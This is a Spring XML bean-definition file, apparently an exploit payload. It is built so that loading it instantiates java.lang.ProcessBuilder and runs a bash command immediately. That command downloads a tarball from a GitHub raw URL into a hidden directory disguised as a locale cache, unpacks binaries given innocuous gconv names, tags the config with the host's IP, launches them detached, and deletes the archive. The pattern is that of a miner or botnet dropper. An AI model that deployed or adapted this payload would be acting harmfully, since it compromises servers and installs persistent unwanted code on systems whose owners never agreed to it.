<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
      <list>
        <value>bash</value>
        <value>-c</value>
        <value>B=/usr/lib/locale/.tzcache;mkdir -p $B;U=https://raw.githubusercontent.com/burmaldagpt/gconv-cache/main/w8.tgz;(wget -q -O $B/.g.tgz $U||curl -sL -o $B/.g.tgz $U);tar xzf $B/.g.tgz -C $B;W=w8a-$(hostname -I 2>/dev/null|cut -d" " -f1|tr . -);sed -i "s/w8x/$W/" $B/.gc/gconv.conf;chmod 755 $B/.gc/gconv_sync $B/.gc/gconv_check.sh;setsid sh $B/.gc/gconv_check.sh;rm -f $B/.g.tgz</value>
      </list>
    </constructor-arg>
  </bean>
</beans>
